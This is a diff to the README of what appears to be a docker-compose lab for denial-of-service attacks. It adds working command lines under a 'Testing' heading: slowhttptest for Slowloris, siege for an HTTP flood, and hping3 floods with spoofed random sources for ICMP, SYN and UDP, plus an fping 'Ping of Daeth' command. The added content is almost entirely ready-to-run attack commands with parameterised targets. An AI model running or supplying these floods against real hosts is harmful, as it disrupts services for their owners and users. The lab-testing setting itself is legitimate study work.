@@ -38,11 +38,34 @@ docker-compose run attacker bash
 - udp-flood.sh - ***UDP Flood***
 
 
-## Results
+## Testing
 
 ### Slowloris
+```
+slowhttptest -c 2000 -H -g -o slowhttp -i 10 -r 200 -t GET -u ${TARGET_URL} -x 24 -p 3
+```
+
 ### HTTP Flood
+```
+siege -b -c250 -t60s ${TARGET_URL}
+```
+
 ### ICMP Flood
+```
+hping3 --flood --rand-source -1 -p ${TARGET_PORT} ${TARGET_IP}
+```
+
 ### Ping of Daeth
+```
+fping -b 65500 ${TARGET_IP}
+```
+
 ### SYN Flood
+```
+hping3 -c 20000 -d 120 -S -w 64 -p ${TARGET_PORT} --flood --rand-source ${TARGET_IP}
+```
+
 ### UDP Flood
+```
+hping3 --flood --rand-source --udp -p ${TARGET_PORT} ${TARGET_IP}
+```
